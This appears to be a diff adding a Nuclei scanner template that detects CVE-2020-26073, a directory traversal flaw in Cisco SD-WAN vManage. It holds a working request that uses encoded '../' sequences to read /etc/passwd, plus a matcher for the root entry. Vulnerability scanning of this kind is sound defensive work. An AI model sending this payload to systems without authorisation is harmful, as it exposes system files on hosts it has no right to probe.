@@ -1,0 +1,33 @@
+id: cve-2020-26073
+
+info:
+  name: Cisco SD-WAN vManage Software Directory Traversal
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Cisco SD-WAN vManage Software contains a directory traversal vulnerability allowing remote attackers to access sensitive files or restricted directories using traversal characters.
+  classification:
+    cve-id: CVE-2020-26073
+    cvss-score: 7.5
+  tags: directory-traversal, cisco
+  reference:
+    - https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-vman-traversal-hQh24tmk.html
+
+variables:
+  fileName: "%2Fetc%2Fpasswd"
+
+http:
+  - raw:
+      - |
+        GET /dataservice/disasterrecovery/download/token/%2E%2E%2F%2E%2E%2F%2E%2E%2F{{fileName}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Nuclei-Template
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
